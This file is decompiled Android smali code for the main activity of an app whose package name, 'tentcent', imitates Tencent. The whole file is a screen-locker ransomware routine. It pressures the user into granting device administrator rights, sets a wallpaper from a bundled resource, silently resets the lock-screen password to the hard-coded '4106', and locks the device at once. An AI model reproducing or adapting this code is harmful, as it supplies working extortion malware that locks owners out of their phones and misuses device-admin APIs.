.class public Lcom/tentcent/ckq/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field manager:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 71
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    invoke-static {p0}, LLogCatBroadcaster;->start(Landroid/content/Context;)V

    .line 21
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/tentcent/ckq/MainActivity;->setContentView(I)V

    .line 26
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/tentcent/ckq/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lcom/tentcent/ckq/MainActivity;->manager:Landroid/app/admin/DevicePolicyManager;

    .line 28
    new-instance v0, Landroid/content/ComponentName;

    :try_start_0
    const-string v1, "com.tentcent.ckq.MyAdmin"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 33
    iget-object v1, p0, Lcom/tentcent/ckq/MainActivity;->manager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v1, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 36
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 40
    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 42
    invoke-virtual {p0, v1}, Lcom/tentcent/ckq/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 44
    const-string v0, "\u8f6f\u4ef6\u9700\u8981\u83b7\u53d6\u8bbe\u5907\u7ba1\u7406\u5668\u624d\u53ef\u4ee5\u8fd0\u884c\uff01"

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 47
    invoke-virtual {p0}, Lcom/tentcent/ckq/MainActivity;->finish()V

    .line 67
    :goto_0
    return-void

    .line 28
    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/NoClassDefFoundError;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v1

    .line 56
    :cond_0
    invoke-virtual {p0}, Lcom/tentcent/ckq/MainActivity;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    .line 59
    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v0

    .line 62
    :try_start_1
    invoke-virtual {p0, v0}, Lcom/tentcent/ckq/MainActivity;->setWallpaper(Ljava/io/InputStream;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 66
    :goto_1
    iget-object v0, p0, Lcom/tentcent/ckq/MainActivity;->manager:Landroid/app/admin/DevicePolicyManager;

    const-string v1, "4106"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    .line 67
    iget-object v0, p0, Lcom/tentcent/ckq/MainActivity;->manager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    goto :goto_0

    .line 62
    :catch_1
    move-exception v0

    .line 64
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
